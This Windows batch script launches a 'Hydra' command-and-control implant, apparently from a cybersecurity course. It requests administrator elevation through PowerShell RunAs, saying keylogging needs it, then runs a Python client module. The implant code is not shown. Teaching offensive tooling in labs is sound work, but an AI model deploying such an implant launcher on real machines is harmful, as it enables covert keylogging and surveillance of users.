@echo off
echo Hydra C2 Implant Launcher - Cybersecurity Course
echo ==============================================
echo This will launch the Hydra implant with elevated privileges
echo required for keylogging and other advanced features.
echo.

REM Check if the script is running with administrator privileges
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Already running as administrator. Continuing...
) else (
    echo Requesting administrator privileges...
    
    REM Try to restart with administrator privileges
    powershell -Command "Start-Process '%~dpnx0' -Verb RunAs"
    exit /b
)

echo.
echo Starting implant with full privileges...
echo.

REM Set the Python environment
if exist "..\venv\Scripts\activate.bat" (
    call "..\venv\Scripts\activate.bat"
) else (
    echo Warning: Virtual environment not found.
)

REM Run the implant script
cd ..\
python -m client.hydra_client.main

echo.
echo Implant process has ended.
pause 